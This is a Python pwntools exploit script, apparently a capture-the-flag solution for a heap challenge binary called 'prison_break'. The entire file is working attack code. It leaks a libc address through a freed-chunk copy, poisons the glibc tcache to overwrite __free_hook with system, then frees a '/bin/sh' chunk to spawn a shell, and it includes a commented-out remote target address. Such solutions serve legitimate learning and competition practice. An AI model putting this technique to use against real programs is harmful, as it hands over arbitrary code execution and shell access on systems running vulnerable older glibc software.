#!/usr/bin/env python3

from pwn import *

exe = ELF("./prison_break_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

def create(idx : int, size : int, data : bytes):
    r.sendlineafter("# ", "1")
    r.sendlineafter("index:\n", str(idx))
    r.sendlineafter("size:\n", str(size))
    r.sendlineafter("data:\n", data)

def delete(idx : int):
    r.sendlineafter("# ", "2")
    r.sendlineafter("index:\n", str(idx))

def view(idx : int):
    r.sendlineafter("# ", "3")
    r.sendlineafter("index:\n", str(idx))
    r.recvuntil(b'entry:\n')
    return r.recvline().strip()

def copy_paste(src : int, dst : int):
    r.sendlineafter("# ", "4")
    r.sendlineafter("index:\n", str(src))
    r.sendlineafter("index:\n", str(dst))

def conn():
    r = process([exe.path])
    # r = remote('94.237.59.45', 30722)
    return r


def main():
    global r
    r = conn()

    create(1, 0x1000, b'BOB')
    create(2, 0x20, b'EVE')
    create(3, 0x1000, b'ALICE')
    create(4, 0x20, b'JACK')
    create(5, 0x1000, b'JILL')

    # leaking libc
    delete(1)
    delete(3)
    
    copy_paste(1, 5)
    leak = view(5)
    leak = u64(leak.ljust(8, b'\x00'))
    print(f'leak @ {hex(leak)}')
    libc.address = leak + (0x76ff2d400000 - 0x76ff2d7ebca0)
    print(f'libc @ {hex(libc.address)}')
    
    # tcache poisoning 
    create(6, 0x1000, b'/bin/sh\x00')
    create(7, 0x1000, b'JILL')
    create(1, 0x20, b'JILL')
    create(3, 0x20, b'JACK')
    payload = p64(libc.symbols['__free_hook'])
    create(8, 0x20, payload)
    
    delete(2)
    delete(1)
    # r.interactive()
    copy_paste(8, 1)

    # points to __free_hook
    create(2, 0x20, b'JACK')
    create(1, 0x20, p64(libc.symbols['system']))

    # exploiting
    delete(6)

    r.interactive()


if __name__ == "__main__":
    main()
